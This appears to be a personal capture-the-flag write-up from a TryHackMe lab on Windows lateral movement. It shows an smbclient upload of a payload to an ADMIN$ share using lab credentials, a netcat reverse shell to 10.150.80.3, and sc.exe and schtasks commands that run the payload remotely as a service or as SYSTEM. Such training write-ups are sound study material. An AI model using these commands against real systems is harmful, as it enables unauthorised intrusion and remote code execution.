---
layout: default
weight: 0
type: docs
---
# Spawning Processes Remotely

## Creating Services Using sc



- [x] **Goal** = To move from THMJMP2 to THM-IIS (machine to machine)

- [x] **Requirements** 
  
  - Need to have admin account credentials.
    
    

Her we have our Initial Foot Hold on a computer **THMJMP2** and we need to move to machine **THM-IIS** 

### Attack flow :-

- We first transfer a reverse shell on target's ADMIN& share.

- Then we will user the compromized admin creds to get network admin.

- And finally we will create a evil service on target remotelly and the binary path will be our shell droped on THM-IIS ADMIN$ share.



This is a manuall process for maximum stealth but we can same achive this by using tools like when u have targets credentials.

    1. pxexec.exe

    2. winrs.exe 



#### 1. Transfering Payload To ADMIN$ Share.

```bash
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

This will drop our service executable to targets ADMIN$ share.

![](/home/ak/.config/marktext/images/2026-01-15-18-41-53-image.png)

#### 2. Using Admin Creds To Get Network Admin

```powershell
runas /netonly /user:ZA.TRYHACKME>COM\t1_leonard.summers "C:\tools\nc64.exe -e cmd.exe 10.150.80.3 4554"
```

![](/home/ak/.config/marktext/images/2026-01-15-18-31-07-image.png)

#### 3. Compromizing THM-IIS

This Below will run at our compromized user to remotely create a service on target THM-IIS.

```powershell
sc.exe \\thmiis.za.tryhackme.com create THMservice-3250 binPath= "%windir%\myservice.exe" start= auto
```

And finally starting the service.

```powershell
sc.exe \\thmiis.za.tryhackme.com start THMservice-3250
```



## Creating Scheduled Tasks Remotely

As shown above we can leverege sc.exe to create and spawn services remotely but another method is by using **schtasks**. 



#### 1. To create a schtask
   
   ```powershell
   schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00
   ```

#### 2.  Running a schtask
	
   ```powershell
   schtasks /s TARGET /run /TN "THMtask1" 
   ```
 	
